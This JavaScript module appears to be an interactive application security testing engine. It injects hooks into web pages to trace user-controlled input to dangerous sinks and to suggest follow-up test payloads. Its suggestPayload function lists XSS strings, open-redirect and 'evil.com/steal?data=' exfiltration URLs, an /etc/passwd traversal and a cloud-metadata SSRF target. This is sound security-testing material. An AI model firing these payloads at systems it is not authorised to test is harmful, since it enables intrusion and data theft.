/**
 * ANBU IAST Engine -- Interactive Application Security Testing via CDP
 * ====================================================================
 * Hooks JavaScript APIs at the runtime level to trace data flow from
 * user-controlled sources through transforms to dangerous sinks.
 * Generates a taint flow graph and suggests optimal DAST payloads.
 *
 * Tracks: String ops, URL manipulation, DOM APIs, storage, crypto,
 *         JSON roundtrips, encoding transforms.
 *
 * Integration:
 *   const payload = buildIastPayload();
 *   await cdpSession.send('Runtime.evaluate', { expression: payload });
 *   // ... user interacts with page ...
 *   const raw = await page.evaluate(() => window.__ANBU_IAST_LOG);
 *   const events = parseIastEvents(raw);
 */
'use strict';

/**
 * Build the injectable JS payload string.
 * Returned string is a self-contained IIFE safe for CDP Runtime.evaluate.
 */
function buildIastPayload() {
    return `(function __ANBU_IAST_ENGINE__() {
    'use strict';

    /* ── Guard: only run once ── */
    if (window.__ANBU_IAST_ARMED) return;
    window.__ANBU_IAST_ARMED = true;
    window.__ANBU_IAST_LOG = [];

    /* ── Utility ── */
    var _log = window.__ANBU_IAST_LOG;
    var _flowId = 0;
    var _nodeId = 0;
    function nextFlowId() { return 'flow_' + (++_flowId); }
    function nextNodeId() { return 'n_' + (++_nodeId); }
    function ts() { return Date.now(); }
    function stack() { try { throw new Error(); } catch (e) { return (e.stack || '').split('\\n').slice(2, 6).join('\\n'); } }
    function trunc(v, n) { var s; try { s = String(v); } catch (_) { s = '[uncoercible]'; } return s.length > (n || 512) ? s.slice(0, n || 512) + '...' : s; }

    function emit(data) {
        try { _log.push(data); } catch (_) {}
    }

    /* ═══════════════════════════════════════════════
     * TAINT TRACKING CORE
     * ═══════════════════════════════════════════════
     * We track taint via a global Map keyed by string value hash + id.
     * Since JS strings are immutable, we identify tainted values by content
     * and a monotonic tag. A WeakMap on boxed objects handles references.
     */

    var _taintMap = new Map();      /* taintId -> { source, transforms[], value, flowId } */
    var _taintLookup = new Map();   /* stringValue -> Set(taintId) -- for value-based lookup */
    var _maxTaintEntries = 10000;
    var _taintCounter = 0;

    function taintId() { return 't_' + (++_taintCounter); }

    function registerTaint(source, value, flowId) {
        if (_taintMap.size > _maxTaintEntries) return null;
        var id = taintId();
        var vstr = trunc(value, 256);
        _taintMap.set(id, {
            id: id,
            source: source,
            transforms: [],
            value: vstr,
            flowId: flowId || nextFlowId(),
            createdAt: ts()
        });
        /* Index by value for lookup */
        if (typeof value === 'string' && value.length > 0 && value.length < 4096) {
            if (!_taintLookup.has(value)) _taintLookup.set(value, new Set());
            _taintLookup.get(value).add(id);
        }
        return id;
    }

    function lookupTaint(value) {
        if (typeof value !== 'string' || value.length === 0 || value.length > 4096) return null;
        var ids = _taintLookup.get(value);
        if (!ids || ids.size === 0) return null;
        /* Return first match */
        for (var id of ids) {
            if (_taintMap.has(id)) return _taintMap.get(id);
        }
        return null;
    }

    function propagateTaint(parentValue, childValue, transform) {
        var parent = lookupTaint(parentValue);
        if (!parent) return null;
        var childId = registerTaint(parent.source, childValue, parent.flowId);
        if (!childId) return null;
        var child = _taintMap.get(childId);
        child.transforms = parent.transforms.concat([{
            api: transform,
            inputValue: trunc(parentValue, 128),
            outputValue: trunc(childValue, 128),
            location: stack(),
            nodeId: nextNodeId(),
            timestamp: ts()
        }]);
        return childId;
    }

    /* ═══════════════════════════════════════════════
     * SOURCE REGISTRATION
     * Mark user-controlled inputs as tainted
     * ═══════════════════════════════════════════════ */

    /* ── URL parameters ── */
    try {
        var params = new URLSearchParams(location.search);
        params.forEach(function(val, key) {
            registerTaint('url_param:' + key, val);
        });
    } catch (_) {}

    /* ── Hash fragment ── */
    try {
        if (location.hash && location.hash.length > 1) {
            registerTaint('hash', location.hash.slice(1));
        }
    } catch (_) {}

    /* ── document.referrer ── */
    try {
        if (document.referrer) {
            registerTaint('referrer', document.referrer);
        }
    } catch (_) {}

    /* ── window.name ── */
    try {
        if (window.name) {
            registerTaint('window.name', window.name);
        }
    } catch (_) {}

    /* ── Cookie values ── */
    try {
        var cookies = document.cookie.split(';');
        cookies.forEach(function(pair) {
            var parts = pair.trim().split('=');
            if (parts.length >= 2) {
                var ck = parts[0].trim();
                var cv = parts.slice(1).join('=').trim();
                if (cv.length > 0) registerTaint('cookie:' + ck, cv);
            }
        });
    } catch (_) {}

    /* ── URL path segments ── */
    try {
        var segments = location.pathname.split('/').filter(function(s) { return s.length > 0; });
        segments.forEach(function(seg, i) {
            registerTaint('path_segment:' + i, seg);
        });
    } catch (_) {}

    /* ── postMessage data (dynamic) ── */
    try {
        window.addEventListener('message', function(event) {
            var data;
            try { data = typeof event.data === 'string' ? event.data : JSON.stringify(event.data); } catch (_) { data = String(event.data); }
            registerTaint('postMessage:' + (event.origin || '*'), data);
        }, true);
    } catch (_) {}

    /* ═══════════════════════════════════════════════
     * TRANSFORM HOOKS -- String operations
     * ═══════════════════════════════════════════════ */

    function hookStringMethod(name) {
        try {
            var orig = String.prototype[name];
            if (!orig) return;
            String.prototype[name] = function() {
                var result = orig.apply(this, arguments);
                try {
                    var self = String(this);
                    if (typeof result === 'string') {
                        propagateTaint(self, result, 'String.' + name);
                    } else if (Array.isArray(result)) {
                        /* split() produces array of strings -- taint each part */
                        for (var i = 0; i < result.length; i++) {
                            if (typeof result[i] === 'string') {
                                propagateTaint(self, result[i], 'String.' + name + '[' + i + ']');
                            }
                        }
                    }
                } catch (_) {}
                return result;
            };
        } catch (_) {}
    }

    var stringMethods = [
        'replace', 'replaceAll', 'split', 'substring', 'substr', 'slice',
        'concat', 'trim', 'trimStart', 'trimEnd', 'toLowerCase', 'toUpperCase',
        'normalize', 'repeat', 'padStart', 'padEnd', 'at'
    ];
    stringMethods.forEach(hookStringMethod);

    /* String.prototype.match/matchAll -- propagate captured groups */
    try {
        var _origMatch = String.prototype.match;
        String.prototype.match = function(re) {
            var result = _origMatch.call(this, re);
            try {
                var self = String(this);
                if (result && Array.isArray(result)) {
                    for (var i = 0; i < result.length; i++) {
                        if (typeof result[i] === 'string') {
                            propagateTaint(self, result[i], 'String.match[' + i + ']');
                        }
                    }
                }
            } catch (_) {}
            return result;
        };
    } catch (_) {}

    /* String + concatenation via template literals and + operator is hard to hook.
       We detect it at sink time via value-based lookup instead. */

    /* ═══════════════════════════════════════════════
     * TRANSFORM HOOKS -- URL manipulation
     * ═══════════════════════════════════════════════ */

    /* ── encodeURIComponent / decodeURIComponent ── */
    function hookEncoder(name) {
        try {
            var orig = window[name];
            window[name] = function(str) {
                var result = orig(str);
                try { propagateTaint(String(str), result, name); } catch (_) {}
                return result;
            };
        } catch (_) {}
    }
    hookEncoder('encodeURIComponent');
    hookEncoder('decodeURIComponent');
    hookEncoder('encodeURI');
    hookEncoder('decodeURI');

    /* ── URL constructor ── */
    try {
        var _origURL = window.URL;
        window.URL = function(url, base) {
            var instance = base ? new _origURL(url, base) : new _origURL(url);
            try {
                var urlStr = typeof url === 'string' ? url : String(url);
                propagateTaint(urlStr, instance.href, 'new URL');
                propagateTaint(urlStr, instance.pathname, 'URL.pathname');
                propagateTaint(urlStr, instance.search, 'URL.search');
                propagateTaint(urlStr, instance.hash, 'URL.hash');
                propagateTaint(urlStr, instance.hostname, 'URL.hostname');
            } catch (_) {}
            return instance;
        };
        window.URL.prototype = _origURL.prototype;
        window.URL.createObjectURL = _origURL.createObjectURL;
        window.URL.revokeObjectURL = _origURL.revokeObjectURL;
    } catch (_) {}

    /* ── URLSearchParams ── */
    try {
        var _origUSPGet = URLSearchParams.prototype.get;
        URLSearchParams.prototype.get = function(name) {
            var result = _origUSPGet.call(this, name);
            if (result !== null) {
                try {
                    /* If the full search string is tainted, propagate to individual param values */
                    var searchStr = location.search;
                    propagateTaint(searchStr, result, 'URLSearchParams.get(' + name + ')');
                } catch (_) {}
            }
            return result;
        };
    } catch (_) {}

    /* ═══════════════════════════════════════════════
     * TRANSFORM HOOKS -- DOM APIs
     * ═══════════════════════════════════════════════ */

    /* ── getElementById ── */
    try {
        var _origGetById = document.getElementById.bind(document);
        document.getElementById = function(id) {
            var el = _origGetById(id);
            /* Not a taint propagation per se, but if id came from tainted source, note it */
            try { propagateTaint(id, id, 'document.getElementById'); } catch (_) {}
            return el;
        };
    } catch (_) {}

    /* ── querySelector / querySelectorAll ── */
    try {
        var _origQS = document.querySelector.bind(document);
        document.querySelector = function(sel) {
            try { propagateTaint(sel, sel, 'document.querySelector'); } catch (_) {}
            return _origQS(sel);
        };
    } catch (_) {}

    /* ── getAttribute ── */
    try {
        var _origGetAttr = Element.prototype.getAttribute;
        Element.prototype.getAttribute = function(name) {
            var val = _origGetAttr.call(this, name);
            if (val !== null) {
                try { propagateTaint(name, val, 'getAttribute(' + name + ')'); } catch (_) {}
            }
            return val;
        };
    } catch (_) {}

    /* ── dataset access is via Proxy (too invasive for all elements).
       Instead we hook at the attribute level above. ── */

    /* ═══════════════════════════════════════════════
     * TRANSFORM HOOKS -- Storage
     * ═══════════════════════════════════════════════ */

    function hookStorage(storageName) {
        try {
            var storage = window[storageName];
            if (!storage) return;

            var _origGetItem = storage.getItem.bind(storage);
            storage.getItem = function(key) {
                var val = _origGetItem(key);
                if (val !== null) {
                    try { propagateTaint(key, val, storageName + '.getItem(' + key + ')'); } catch (_) {}
                }
                return val;
            };

            var _origSetItem = storage.setItem.bind(storage);
            storage.setItem = function(key, value) {
                try {
                    var taint = lookupTaint(String(value));
                    if (taint) {
                        emit({
                            type: 'iast_storage_write',
                            source: taint.source,
                            storageType: storageName,
                            key: key,
                            value: trunc(value, 256),
                            flowId: taint.flowId,
                            transforms: taint.transforms,
                            timestamp: ts()
                        });
                    }
                } catch (_) {}
                return _origSetItem(key, value);
            };
        } catch (_) {}
    }
    hookStorage('localStorage');
    hookStorage('sessionStorage');

    /* ═══════════════════════════════════════════════
     * TRANSFORM HOOKS -- Crypto (atob/btoa/subtle)
     * ═══════════════════════════════════════════════ */

    try {
        var _origAtob = window.atob;
        window.atob = function(str) {
            var result = _origAtob(str);
            try { propagateTaint(str, result, 'atob'); } catch (_) {}
            return result;
        };
    } catch (_) {}

    try {
        var _origBtoa = window.btoa;
        window.btoa = function(str) {
            var result = _origBtoa(str);
            try { propagateTaint(str, result, 'btoa'); } catch (_) {}
            return result;
        };
    } catch (_) {}

    /* ═══════════════════════════════════════════════
     * TRANSFORM HOOKS -- JSON parse/stringify roundtrips
     * ═══════════════════════════════════════════════ */

    try {
        var _origJSONParse = JSON.parse;
        JSON.parse = function(text, reviver) {
            var result = _origJSONParse.call(JSON, text, reviver);
            try {
                var textStr = String(text);
                /* If the input text was tainted, propagate into result values */
                var taint = lookupTaint(textStr);
                if (taint && result && typeof result === 'object') {
                    propagateIntoObject(result, taint, 'JSON.parse');
                }
            } catch (_) {}
            return result;
        };
    } catch (_) {}

    try {
        var _origJSONStringify = JSON.stringify;
        JSON.stringify = function(value, replacer, space) {
            var result = _origJSONStringify.call(JSON, value, replacer, space);
            try {
                /* If any property value in the input is tainted, taint the output */
                if (value && typeof value === 'object') {
                    scanObjectForTaint(value, result, 'JSON.stringify');
                }
            } catch (_) {}
            return result;
        };
    } catch (_) {}

    function propagateIntoObject(obj, parentTaint, api) {
        try {
            if (typeof obj === 'string') {
                propagateTaint(parentTaint.value, obj, api);
                return;
            }
            if (Array.isArray(obj)) {
                for (var i = 0; i < obj.length && i < 100; i++) {
                    propagateIntoObject(obj[i], parentTaint, api + '[' + i + ']');
                }
                return;
            }
            if (obj && typeof obj === 'object') {
                var keys = Object.keys(obj);
                for (var k = 0; k < keys.length && k < 100; k++) {
                    propagateIntoObject(obj[keys[k]], parentTaint, api + '.' + keys[k]);
                }
            }
        } catch (_) {}
    }

    function scanObjectForTaint(obj, result, api) {
        try {
            if (typeof obj === 'string') {
                propagateTaint(obj, result, api);
                return;
            }
            if (Array.isArray(obj)) {
                for (var i = 0; i < obj.length && i < 100; i++) {
                    scanObjectForTaint(obj[i], result, api);
                }
                return;
            }
            if (obj && typeof obj === 'object') {
                var keys = Object.keys(obj);
                for (var k = 0; k < keys.length && k < 50; k++) {
                    scanObjectForTaint(obj[keys[k]], result, api);
                }
            }
        } catch (_) {}
    }

    /* ═══════════════════════════════════════════════
     * SINK DETECTION -- Emit iast_flow on tainted sink hit
     * ═══════════════════════════════════════════════ */

    function detectSinkContext(sink) {
        if (/innerHTML|outerHTML|insertAdjacentHTML|document\\.write|DOMParser|createContextualFragment/.test(sink)) return 'html';
        if (/eval|Function|setTimeout|setInterval/.test(sink)) return 'js';
        if (/\\.href|\\.src|\\.action|location|window\\.open|URL/.test(sink)) return 'url';
        if (/\\.setAttribute|dataset/.test(sink)) return 'attribute';
        if (/fetch|XMLHttpRequest|\\$.ajax|axios/.test(sink)) return 'request';
        return 'unknown';
    }

    function suggestPayload(context, source) {
        switch (context) {
            case 'html':
                return {
                    payloads: [
                        '<img src=x onerror=alert(document.domain)>',
                        '<svg/onload=alert(document.domain)>',
                        '"><img src=x onerror=alert(document.domain)>',
                        "'-alert(document.domain)-'"
                    ],
                    type: 'xss',
                    confidence: 0.8
                };
            case 'js':
                return {
                    payloads: [
                        "';alert(document.domain)//",
                        '");alert(document.domain)//',
                        '\\\\x3csvg/onload=alert(document.domain)\\\\x3e',
                        String.fromCharCode(36) + '{alert(document.domain)}'
                    ],
                    type: 'xss_js_context',
                    confidence: 0.85
                };
            case 'url':
                return {
                    payloads: [
                        'javascript:alert(document.domain)',
                        '//evil.com',
                        'https://evil.com',
                        'data:text/html,<script>alert(document.domain)</script>'
                    ],
                    type: 'redirect_or_ssrf',
                    confidence: 0.7
                };
            case 'attribute':
                return {
                    payloads: [
                        '" onmouseover="alert(document.domain)',
                        "' onfocus='alert(document.domain)' autofocus='",
                        '" style="background:url(javascript:alert(1))',
                        '"><script>alert(document.domain)</script>'
                    ],
                    type: 'xss_attribute',
                    confidence: 0.75
                };
            case 'request':
                return {
                    payloads: [
                        'https://evil.com/steal?data=',
                        '../../../etc/passwd',
                        'http://169.254.169.254/latest/meta-data/'
                    ],
                    type: 'ssrf_or_lfi',
                    confidence: 0.6
                };
            default:
                return { payloads: [], type: 'unknown', confidence: 0.3 };
        }
    }

    function onTaintedSinkHit(sink, value, element) {
        try {
            var vstr = String(value);
            var taint = lookupTaint(vstr);
            if (!taint) return;

            var ctx = detectSinkContext(sink);
            var suggestion = suggestPayload(ctx, taint.source);

            emit({
                type: 'iast_flow',
                source: taint.source,
                transforms: taint.transforms,
                sink: sink,
                context: ctx,
                flowId: taint.flowId,
                value: trunc(vstr, 512),
                suggested_payload: suggestion,
                confidence: suggestion.confidence,
                element: element ? (element.tagName || '') + (element.id ? '#' + element.id : '') : null,
                callStack: stack(),
                timestamp: ts()
            });
        } catch (_) {}
    }

    /* ═══════════════════════════════════════════════
     * SINK HOOKS (same sinks as dom-invader, but IAST-aware)
     * ═══════════════════════════════════════════════ */

    /* ── innerHTML / outerHTML ── */
    function hookHTMLProp(proto, prop) {
        try {
            var desc = Object.getOwnPropertyDescriptor(proto, prop);
            if (!desc || !desc.set) return;
            var origSet = desc.set;
            Object.defineProperty(proto, prop, {
                set: function(val) {
                    onTaintedSinkHit(prop, val, this);
                    return origSet.call(this, val);
                },
                get: desc.get,
                enumerable: desc.enumerable,
                configurable: true
            });
        } catch (_) {}
    }
    hookHTMLProp(Element.prototype, 'innerHTML');
    hookHTMLProp(Element.prototype, 'outerHTML');

    /* ── insertAdjacentHTML ── */
    try {
        var _origIAH = Element.prototype.insertAdjacentHTML;
        Element.prototype.insertAdjacentHTML = function(pos, text) {
            onTaintedSinkHit('insertAdjacentHTML', text, this);
            return _origIAH.call(this, pos, text);
        };
    } catch (_) {}

    /* ── document.write / writeln ── */
    try {
        var _origDW = document.write.bind(document);
        document.write = function() {
            var html = Array.prototype.join.call(arguments, '');
            onTaintedSinkHit('document.write', html, null);
            return _origDW.apply(document, arguments);
        };
    } catch (_) {}
    try {
        var _origDWL = document.writeln.bind(document);
        document.writeln = function() {
            var html = Array.prototype.join.call(arguments, '');
            onTaintedSinkHit('document.writeln', html, null);
            return _origDWL.apply(document, arguments);
        };
    } catch (_) {}

    /* ── eval ── */
    try {
        var _origEval = window.eval;
        window.eval = function(code) {
            onTaintedSinkHit('eval', code, null);
            return _origEval.call(window, code);
        };
    } catch (_) {}

    /* ── Function constructor ── */
    try {
        var _origFn = Function;
        var _FnProxy = new Proxy(_origFn, {
            construct: function(target, args) {
                if (args.length > 0) onTaintedSinkHit('Function', args[args.length - 1], null);
                return new (Function.prototype.bind.apply(target, [null].concat(Array.from(args))))();
            },
            apply: function(target, thisArg, args) {
                if (args.length > 0) onTaintedSinkHit('Function', args[args.length - 1], null);
                return target.apply(thisArg, args);
            }
        });
        window.Function = _FnProxy;
    } catch (_) {}

    /* ── setTimeout / setInterval (string arg) ── */
    function hookTimer(name) {
        try {
            var orig = window[name];
            window[name] = function(handler) {
                if (typeof handler === 'string') onTaintedSinkHit(name + '(string)', handler, null);
                return orig.apply(window, arguments);
            };
        } catch (_) {}
    }
    hookTimer('setTimeout');
    hookTimer('setInterval');

    /* ── location.assign / replace ── */
    try {
        var _origLA = location.assign.bind(location);
        location.assign = function(url) {
            onTaintedSinkHit('location.assign', url, null);
            return _origLA(url);
        };
    } catch (_) {}
    try {
        var _origLR = location.replace.bind(location);
        location.replace = function(url) {
            onTaintedSinkHit('location.replace', url, null);
            return _origLR(url);
        };
    } catch (_) {}

    /* ── window.open ── */
    try {
        var _origWO = window.open;
        window.open = function(url, target, features) {
            onTaintedSinkHit('window.open', url, null);
            return _origWO.call(window, url, target, features);
        };
    } catch (_) {}

    /* ── Dynamic element src/href/action ── */
    function hookElemAttr(proto, attr) {
        try {
            var desc = Object.getOwnPropertyDescriptor(proto, attr);
            if (!desc || !desc.set) return;
            var origSet = desc.set;
            Object.defineProperty(proto, attr, {
                set: function(val) {
                    onTaintedSinkHit('element.' + attr, val, this);
                    return origSet.call(this, val);
                },
                get: desc.get,
                enumerable: desc.enumerable,
                configurable: true
            });
        } catch (_) {}
    }
    if (typeof HTMLScriptElement !== 'undefined') hookElemAttr(HTMLScriptElement.prototype, 'src');
    if (typeof HTMLImageElement !== 'undefined') hookElemAttr(HTMLImageElement.prototype, 'src');
    if (typeof HTMLIFrameElement !== 'undefined') hookElemAttr(HTMLIFrameElement.prototype, 'src');
    if (typeof HTMLAnchorElement !== 'undefined') hookElemAttr(HTMLAnchorElement.prototype, 'href');
    if (typeof HTMLFormElement !== 'undefined') hookElemAttr(HTMLFormElement.prototype, 'action');

    /* ── setAttribute for dangerous attrs ── */
    try {
        var _origSetAttr = Element.prototype.setAttribute;
        Element.prototype.setAttribute = function(name, value) {
            var ln = name.toLowerCase();
            if (ln.indexOf('on') === 0 || ln === 'href' || ln === 'src' || ln === 'action' || ln === 'srcdoc') {
                onTaintedSinkHit('setAttribute(' + name + ')', value, this);
            }
            return _origSetAttr.call(this, name, value);
        };
    } catch (_) {}

    /* ── fetch / XHR URL sink ── */
    try {
        var _origFetch = window.fetch;
        window.fetch = function(resource, init) {
            var url = typeof resource === 'string' ? resource : (resource && resource.url ? resource.url : '');
            onTaintedSinkHit('fetch', url, null);
            if (init && init.body) onTaintedSinkHit('fetch.body', init.body, null);
            return _origFetch.apply(window, arguments);
        };
    } catch (_) {}

    try {
        var _origXHROpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            onTaintedSinkHit('XMLHttpRequest.open', url, null);
            return _origXHROpen.apply(this, arguments);
        };
        var _origXHRSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(body) {
            if (body) onTaintedSinkHit('XMLHttpRequest.send', body, null);
            return _origXHRSend.apply(this, arguments);
        };
    } catch (_) {}

    /* ═══════════════════════════════════════════════
     * PERIODIC TAINT SNAPSHOT
     * Dump active taint flows for offline analysis
     * ═══════════════════════════════════════════════ */

    function dumpTaintSnapshot() {
        try {
            var flows = {};
            _taintMap.forEach(function(t) {
                if (t.transforms.length > 0) {
                    if (!flows[t.flowId]) flows[t.flowId] = [];
                    flows[t.flowId].push({
                        source: t.source,
                        value: t.value,
                        transforms: t.transforms.length
                    });
                }
            });
            if (Object.keys(flows).length > 0) {
                emit({
                    type: 'iast_snapshot',
                    activeFlows: Object.keys(flows).length,
                    totalTainted: _taintMap.size,
                    flowSummary: flows,
                    timestamp: ts()
                });
            }
        } catch (_) {}
    }

    /* Snapshot every 10 seconds */
    setInterval(dumpTaintSnapshot, 10000);

    /* ═══════════════════════════════════════════════
     * EXPOSE TAINT MAP FOR EXTERNAL TOOLS
     * ═══════════════════════════════════════════════ */
    window.__ANBU_IAST_TAINT_MAP = _taintMap;
    window.__ANBU_IAST_TAINT_LOOKUP = _taintLookup;

    /* Signal readiness */
    emit({
        type: 'iast_init',
        source: 'iast_engine',
        transforms: [],
        sink: null,
        context: 'init',
        suggested_payload: null,
        confidence: 1,
        timestamp: ts()
    });

})();`;
}

/**
 * Parse the raw event log array from window.__ANBU_IAST_LOG.
 * Normalizes, classifies, and builds taint flow graphs.
 *
 * @param {Array} logArray - raw log from page context
 * @returns {Object} { events, flows, storageWrites, snapshots, stats }
 */
function parseIastEvents(logArray) {
    if (!Array.isArray(logArray)) return { events: [], flows: [], storageWrites: [], snapshots: [], stats: {} };

    var events = [];
    var flows = [];
    var storageWrites = [];
    var snapshots = [];
    var seen = new Set();

    for (var i = 0; i < logArray.length; i++) {
        var e = logArray[i];
        if (!e || !e.type) continue;

        events.push(e);

        if (e.type === 'iast_flow') {
            /* De-dupe flows by source+sink+flowId */
            var fkey = (e.source || '') + '|' + (e.sink || '') + '|' + (e.flowId || '');
            if (seen.has(fkey)) continue;
            seen.add(fkey);

            flows.push({
                flowId: e.flowId,
                source: e.source,
                transforms: e.transforms || [],
                sink: e.sink,
                context: e.context,
                value: e.value,
                suggested_payload: e.suggested_payload,
                confidence: e.confidence,
                element: e.element,
                callStack: e.callStack,
                timestamp: e.timestamp
            });
        } else if (e.type === 'iast_storage_write') {
            storageWrites.push({
                source: e.source,
                storageType: e.storageType,
                key: e.key,
                value: e.value,
                flowId: e.flowId,
                transforms: e.transforms,
                timestamp: e.timestamp
            });
        } else if (e.type === 'iast_snapshot') {
            snapshots.push({
                activeFlows: e.activeFlows,
                totalTainted: e.totalTainted,
                flowSummary: e.flowSummary,
                timestamp: e.timestamp
            });
        }
    }

    /* Build flow graphs: source -> transforms -> sink */
    var flowGraphs = {};
    for (var j = 0; j < flows.length; j++) {
        var f = flows[j];
        var fid = f.flowId || 'unknown';
        if (!flowGraphs[fid]) {
            flowGraphs[fid] = {
                flowId: fid,
                source: f.source,
                sinks: [],
                transforms: [],
                contexts: new Set(),
                maxConfidence: 0,
                payloads: []
            };
        }
        var fg = flowGraphs[fid];
        fg.sinks.push(f.sink);
        fg.contexts.add(f.context);
        if (f.transforms) {
            for (var t = 0; t < f.transforms.length; t++) {
                fg.transforms.push(f.transforms[t]);
            }
        }
        if (f.confidence > fg.maxConfidence) fg.maxConfidence = f.confidence;
        if (f.suggested_payload && f.suggested_payload.payloads) {
            for (var p = 0; p < f.suggested_payload.payloads.length; p++) {
                if (fg.payloads.indexOf(f.suggested_payload.payloads[p]) === -1) {
                    fg.payloads.push(f.suggested_payload.payloads[p]);
                }
            }
        }
    }

    /* Convert Set to Array for serialization */
    var graphList = Object.values(flowGraphs).map(function(fg) {
        fg.contexts = Array.from(fg.contexts);
        /* De-dupe transforms by api */
        var seenTransforms = new Set();
        fg.transforms = fg.transforms.filter(function(t) {
            var key = t.api + '|' + (t.inputValue || '').slice(0, 32);
            if (seenTransforms.has(key)) return false;
            seenTransforms.add(key);
            return true;
        });
        return fg;
    });

    /* Sort by confidence descending */
    graphList.sort(function(a, b) { return b.maxConfidence - a.maxConfidence; });

    var uniqueSources = new Set(flows.map(function(f) { return f.source; }));
    var uniqueSinks = new Set(flows.map(function(f) { return f.sink; }));

    return {
        events: events,
        flows: flows,
        flowGraphs: graphList,
        storageWrites: storageWrites,
        snapshots: snapshots,
        stats: {
            totalEvents: events.length,
            totalFlows: flows.length,
            flowGraphs: graphList.length,
            storageWrites: storageWrites.length,
            uniqueSources: uniqueSources.size,
            uniqueSinks: uniqueSinks.size,
            highConfidenceFlows: flows.filter(function(f) { return f.confidence >= 0.7; }).length
        }
    };
}

module.exports = { buildIastPayload, parseIastEvents };
